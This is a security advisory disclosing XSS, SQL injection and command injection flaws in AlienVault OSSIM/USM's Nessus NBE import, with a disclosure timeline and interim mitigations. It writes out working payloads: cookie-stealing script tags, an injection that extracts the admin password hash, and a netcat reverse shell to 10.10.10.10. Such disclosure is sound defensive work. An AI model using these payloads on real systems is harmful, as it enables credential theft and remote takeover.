@@ -1,0 +1,109 @@
+Details
+=======
+
+Product: Alienvault OSSIM/USM
+Vulnerability: Multiple Vulnerabilities (XSS, SQLi, Command Execution)
+Author: Peter Lapp, lappsec@gmail.com
+CVE: None assigned
+Vulnerable Versions: Tested on 4.14, 4.15, and 5.0. It likely affects
+all previous versions as well.
+Fixed Version: No fix has been released.
+
+
+Summary
+=======
+
+Alienvault OSSIM is an open source SIEM solution designed to collect
+and correlate log data. The vulnerability management section of the UI
+allows a user to upload a Nessus scan in NBE format. Using a specially
+crafted NBE file, a user can exploit multiple vulnerabilities such as
+XSS, SQLi, and Command Execution. Authentication is required to
+exploit this vulnerability, but admin privileges are not required. Any
+user with access to the Vulnerabilities page can perform these
+attacks.
+
+The vendor was notified almost 5 months ago about this vulnerability.
+Given that they have not responded to my recent requests for updates
+and just released a major version that did not patch these issues, I
+have decided to release the details.
+
+
+Technical Details
+=================
+
+Various fields within the NBE file can be manipulated to exploit
+certain vulnerabilities. A pretty bare template that I used to test
+these issues looked something like this:
+
+timestamps|||scan_start|Thu Dec 11 17:00:51 2014|
+timestamps||1.1.1.1|host_start|Thu Dec 11 17:00:52 2014|
+results|1.1.1.1|1.1.1.1|cifs (445/tcp)|1234|Security Hole|Synopsis
+:\n\nThe remote host contains a web browser that is affected by
+multiple vulnerabilities.\nOther references :
+OSVDB:113197,OSVDB:113198,OSVDB:113199,OSVDB:115035\n
+timestamps||1.1.1.1|host_end|Thu Dec 11 17:11:58 2014|
+timestamps|||scan_end|Thu Dec 11 17:16:44 2014|
+
+
+Reflective XSS
+--------------
+The hostname/IP portion of the NBE import is vulnerable. Putting
+<script>alert(0)</script> directly after the hostname/IP in the NBE
+will result in the javascript being reflected back when the import
+finishes.
+
+Stored XSS
+----------
+The plugin ID portion of the NBE is vulnerable.
+Adding<script>alert(document.cookie)</script> to the plugin ID in the
+NBE will result in the script being executed every time someone views
+the HTML report in the OSSIM interface.
+
+Blind SQL Injection
+-------------------
+The plugin ID is also vulnerable to blind SQLi. Adding ' UNION SELECT
+SLEEP(20) AND '1'='1 to the plugin ID will cause the DB to sleep for
+20 seconds.
+
+SQL Injection
+-------------
+The protocol portion of the NBE is vulnerable to SQL injection.
+Take this:
+cifs (445/tcp)
+And turn it to this:
+cifs','0','1(',(select/**/pass/**/from/**/users/**/where/**/login="admin"),'N');#
+(445/tcp)
+
+That will result in the hash of the admin password being included in
+the report. The extra '(' in '1(' is required for the ending ) in
+order to not cause an error in the Perl script that runs the import.
+
+Command Injection
+-----------------
+The hostname/IP portion of the NBE is vulnerable. Adding '#&&nc -c
+/bin/sh 10.10.10.10 4444&&' will result in a reverse shell as www-data
+to 10.10.10.10.
+The initial # is required to comment out the remainder of a SQL query
+that comes before the dig command where this is injected. Without it
+the script won't proceed to the required point.
+
+
+Solution
+========
+
+There's no official patch for this yet. It is possible to restrict
+access to the Vulnerabilities page via user roles, which should
+prevent a user from exploiting this. Also, if you're not using the
+import feature, you could rename the Perl script on the file system
+that runs the import.
+
+
+Timeline
+========
+01/12/2015 - Notified the vendor of the vulnerabilities.
+01/12/2015 - Vendor confirms the issue and files a defect.
+01/28/2015 - Requested an update from the vendor and was told the
+issue would be worked on in the future.
+04/20/2015 - Requested an update and informed the vendor of my intent
+to release the details. No response.
+05/05/2015 - Released details to FD.
